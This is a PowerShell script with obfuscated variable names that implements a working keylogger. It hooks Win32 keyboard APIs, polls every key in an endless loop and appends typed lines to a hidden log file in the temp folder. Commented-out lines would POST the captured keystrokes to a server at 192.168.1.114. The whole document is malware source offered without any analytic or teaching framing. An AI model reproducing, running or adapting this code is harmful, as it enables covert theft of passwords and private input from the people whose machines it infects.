function fence {
$lOgqKdLC99 = "$env:temp\key.log"
$VvGqoqZT99 = 0x00
$DxKJogHU99 = 0x01
$wndsMHLB99 = 0x02
$WBiLxTas99 = 0x03
$KzZclNTK99 = 0x04
$utVtWTXw99 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
'@
$yCsSbQoN99 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
'@
$yKHmJHAO99 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
'@
$YrWjBunI99 = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
$plWQjdVo99 = Add-Type -MemberDefinition $utVtWTXw99 -name "Win32GetState" -namespace Win32Functions -passThru
$WMkuudCP99 = Add-Type -MemberDefinition $yCsSbQoN99 -name "Win32MyGetKeyboardState" -namespace Win32Functions -passThru
$ayxfziDp99 = Add-Type -MemberDefinition $yKHmJHAO99 -name "Win32MyMapVirtualKey" -namespace Win32Functions -passThru
$KtrhVtyB99 = Add-Type -MemberDefinition $YrWjBunI99 -name "Win32MyToUnicode" -namespace Win32Functions -passThru
$hlICDhEZ99 = ""
while ($true) {
Start-Sleep -Milliseconds 40
$ykbZMXTI99 = ""

for ($char = 1; $char -le 254; $char++) {
$vkey = $char
$ykbZMXTI99 = $plWQjdVo99::GetAsyncKeyState($vkey)

if ($ykbZMXTI99 -eq -32767) {

$dZCHfuhJ99 = $plWQjdVo99::GetAsyncKeyState(160)
$uLqgQtGZ99 = $plWQjdVo99::GetAsyncKeyState(161)
$FioUIRth99 = [console]::CapsLock

$svEXMOpQ99 = $ayxfziDp99::MapVirtualKey($vkey, $WBiLxTas99)

$iyEAUatY99 = New-Object Byte[] 256
$pLswWiRe99 = $WMkuudCP99::GetKeyboardState($iyEAUatY99)

$GrSMsyTi99 = New-Object -TypeName "System.Text.StringBuilder";
$zgXCnmhS99 = $KtrhVtyB99::ToUnicode($vkey, $svEXMOpQ99, $iyEAUatY99, $GrSMsyTi99, $GrSMsyTi99.Capacity, 0)

if ($zgXCnmhS99 -gt 0) {
if ($GrSMsyTi99.ToString() -eq "`r") {
Out-File -FilePath $lOgqKdLC99 -Encoding Unicode -Append -InputObject $hlICDhEZ99.ToString()
#$postParams = @{a=$hlICDhEZ99.ToString()}
#Invoke-WebRequest -Uri http://192.168.1.114:8000/ -Body $postParams
$hlICDhEZ99 = ""
}
else {$hlICDhEZ99 = $hlICDhEZ99 + $GrSMsyTi99}
}
}
}
}
}

fence